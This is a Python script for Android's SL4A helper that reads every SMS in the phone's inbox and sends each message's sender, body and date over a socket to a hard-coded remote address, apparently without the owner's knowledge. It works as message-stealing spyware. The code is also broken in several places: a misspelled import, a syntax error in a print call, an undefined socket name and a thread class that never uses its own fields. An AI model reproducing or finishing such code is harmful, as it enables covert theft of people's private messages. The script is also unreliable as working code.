from androidhelper import Adnroid
import threading
import socket 

server_s1 = (('192.168.100.9',1134)) 

droid = Android()

_id = 0

class MessageService(threading.Thread):

    def __init__(self,*details,server):
        self.details = details
        self.server = server
            
    def run(self):
        try:
            server.connect(('192.168.100.9',1134))
            server.send(details.encode('utf-8'))
        except Exception as ex:
            print('Error : 'ex)


def _():

    soc = socket.socket()
    ip = socket.gethostbyname(socket.gethostname())
    port = 879
    addr = ((ip,port))
    soc.bind(addr)
    s.listen(2)
    print(addr)

    while True:
        sms_data = droid.smsGetMessages(False,'inbox')
        #phone_number = sms_data[0]
        for data in sms_data:
            if 'list' in str(type(data)):
                msglist = data
                for _dict in msglist:
                    _id  = _dict['_id']

                    if _id<=198:
                        continue
                    else:
                        msg_details = _dict
                        _date = msg_details['date']
                        _address = msg_details['address']
                        _body = msg_details['body']
                        str5 = '{}:{}:{}:{}'.format(_id,_address,_body,_date)
                        str1 = MessageService(str5,soc)
                        str1.start()
_()